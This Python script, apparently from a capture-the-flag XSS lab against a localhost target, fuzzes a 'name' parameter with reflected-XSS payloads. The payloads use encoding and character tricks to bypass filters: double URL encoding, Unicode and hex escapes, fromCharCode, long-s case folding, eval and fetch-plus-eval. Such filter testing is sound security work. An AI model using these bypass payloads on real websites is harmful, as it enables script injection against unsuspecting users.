import requests
import urllib.parse
import re

target_url = "http://127.0.0.1:32830/page"

def url_encode(s):
    return urllib.parse.quote(s, safe='')

def double_url_encode(s):
    """Double URL encode for filter bypass"""
    return urllib.parse.quote(urllib.parse.quote(s, safe=''), safe='')

def test_encoding_variants():
    """Test different encoding techniques to bypass filters"""
    
    print("="*80)
    print("ADVANCED ENCODING TECHNIQUES FOR FILTER BYPASS")
    print("="*80)
    print("Focus: Tests 2 & 13 worked better (longer responses)")
    print()
    
    # These showed promise with longer responses
    promising_payloads = [
        "Unicode escapes", '";alert("\\u0058\\u0053\\u0053");//',
        "unescape %XX", '";alert(unescape("%58%53%53"));//'
    ]
    
    results = []
    
    for idx, test_type in enumerate(["Unicode", "Unescape"]):
        desc_in = promising_payloads[idx*2]
        payload_in = promising_payloads[idx*2+1]
        
        print(f"\n{'='*80}")
        print(f"TESTING: {desc_in}")
        print(f"{'='*80}")
        
        # Test 1: Single URL encode
        print(f"\n[1] Single URL encode:")
        enc1 = url_encode(payload_in)
        print(f"    {enc1}")
        
        url1 = f"{target_url}?name={enc1}"
        try:
            r1 = requests.get(url1, timeout=10)
            print(f"    Length: {len(r1.text)} | Status: {r1.status_code}")
            if "XSS" in r1.text:
                print(f"    [!] XSS FOUND!")
                results.append((f"{desc_in} (single)", payload_in, enc1, r1.text))
        except Exception as e:
            print(f"    Error: {e}")
        
        # Test 2: Double URL encode
        print(f"\n[2] Double URL encode:")
        enc2 = double_url_encode(payload_in)
        print(f"    {enc2}")
        
        url2 = f"{target_url}?name={enc2}"
        try:
            r2 = requests.get(url2, timeout=10)
            print(f"    Length: {len(r2.text)} | Status: {r2.status_code}")
            if "XSS" in r2.text:
                print(f"    [!] XSS FOUND!")
                results.append((f"{desc_in} (double)", payload_in, enc2, r2.text))
        except Exception as e:
            print(f"    Error: {e}")
        
        # Test 3: HTML entity encode + URL encode
        if test_type == "Unicode":
            print(f"\n[3] HTML entity encode backslashes:")
            # Convert \\ to &#92;
            payload_mod = payload_in.replace("\\\\", "&#92;&#92;")
            enc3 = url_encode(payload_mod)
            print(f"    {enc3}")
            
            url3 = f"{target_url}?name={enc3}"
            try:
                r3 = requests.get(url3, timeout=10)
                print(f"    Length: {len(r3.text)} | Status: {r3.status_code}")
                if "XSS" in r3.text:
                    print(f"    [!] XSS FOUND!")
                    results.append((f"{desc_in} (HTML entity)", payload_mod, enc3, r3.text))
            except Exception as e:
                print(f"    Error: {e}")
    
    return results

def test_character_manipulation():
    """Test character-level manipulations to bypass uppercase S filter"""
    
    print(f"\n{'='*80}")
    print("CHARACTER MANIPULATION ATTACKS")
    print("="*80)
    
    manipulations = []
    
    # Test 1: Case transformation tricks
    # In JavaScript: 'ſ'.toUpperCase() === 'S' (where ſ is U+017F)
    test1 = '";var s="ſ".toUpperCase();alert("X"+s+s);//'
    manipulations.append(("Unicode case transform", test1))
    
    # Test 2: Using fromCharCode with hex
    test2 = '";alert(String.fromCharCode(0x58,0x53,0x53));//'
    manipulations.append(("Hex notation", test2))
    
    # Test 3: UTF-8 sequence
    test3 = '";alert("\\u0058\\u0053\\u0053");//'
    manipulations.append(("UTF-8 escapes", test3))
    
    # Test 4: Escape sequence nesting
    test4 = '";alert("X"+"\\x53\\x53");//'
    manipulations.append(("Mixed literal + hex", test4))
    
    # Test 5: Using String.raw
    test5 = '";alert(String.raw`\\u0058\\u0053\\u0053`);//'
    manipulations.append(("String.raw template", test5))
    
    # Test 6: Template literal with expression
    test6 = '";alert(`${String.fromCharCode(88,83,83)}`);//'
    manipulations.append(("Template literal expr", test6))
    
    # Test 7: Unicode escape in eval
    test7 = '";eval("alert(\"\\u0058\\u0053\\u0053\")");//'
    manipulations.append(("Eval with unicode", test7))
    
    # Test 8: Location hash trick
    test8 = '";location="javascript:alert(\"XSS\")";location.reload();//'
    manipulations.append(("Location javascript:", test8))
    
    # Test 9: Using atob with base64 (already tested but let's try variations)
    test9 = '";var b=atob("WFNT");alert(b);//'
    manipulations.append(("Atob decode", test9))
    
    # Test 10: Using fetch to execute code
    test10 = '";fetch("data:text/javascript,alert(\"XSS\")").then(r=>r.text()).then(eval);//'
    manipulations.append(("Fetch + eval", test10))
    
    results = []
    
    for i, (desc, payload) in enumerate(manipulations, 1):
        print(f"\n[MANIP {i:02d}] {desc}")
        print(f"Raw: {payload}")
        
        enc = url_encode(payload)
        print(f"URL: {target_url}?name={enc}")
        
        try:
            url = f"{target_url}?name={enc}"
            r = requests.get(url, timeout=10)
            text = r.text
            
            print(f"Length: {len(text)}")
            if "XSS" in text:
                print(f"[!] SUCCESS! XSS found")
                
                # Show context
                idx = text.find("XSS")
                snippet = text[max(0, idx-100):idx+50]
                print(f"Context: ...{snippet}...")
                
                results.append((desc, payload, enc, text))
            else:
                # Check for partial reflection
                if "fromCharCode" in text and len(text) > 900:
                    print(f"[+] Partial: fromCharCode reflected, long response")
                elif len(text) > 900:
                    print(f"[+] Anomaly: Longer response without XSS")
                else:
                    print(f"[-] No XSS")
                    
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return results

def test_without_breakout():
    """Test injecting directly without breakout characters"""
    
    print(f"\n{'='*80}")
    print("DIRECT INJECTION (NO BREAKOUT)")
    print("="*80)
    
    # If the filter is blocking special chars, maybe we can work within the string
    direct_tests = []
    
    # Test 1: Inline evaluation via template literal
    test1 = '${alert(String.fromCharCode(88,83,83))}'
    direct_tests.append(("Template literal eval", test1))
    
    # Test 2: String concatenation that evaluates
    test2 = '"+alert(String.fromCharCode(88,83,83))+"'
    direct_tests.append(("String concat eval", test2))
    
    # Test 3: Using eval with closing quote
    test3 = '");eval("alert(String.fromCharCode(88,83,83))");//'
    direct_tests.append(("Eval insertion", test3))
    
    results = []
    
    for i, (desc, payload) in enumerate(direct_tests, 1):
        print(f"\n[DIRECT {i}] {desc}")
        print(f"Raw: {payload}")
        
        enc = url_encode(payload)
        print(f"URL: {target_url}?name={enc}")
        
        try:
            url = f"{target_url}?name={enc}"
            r = requests.get(url, timeout=10)
            text = r.text
            
            print(f"Length: {len(text)}")
            if "XSS" in text:
                print(f"[!] SUCCESS! XSS without breakout!")
                results.append((desc, payload, enc, text))
            else:
                print(f"[-] No XSS")
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return results

# Run all tests
all_results = []
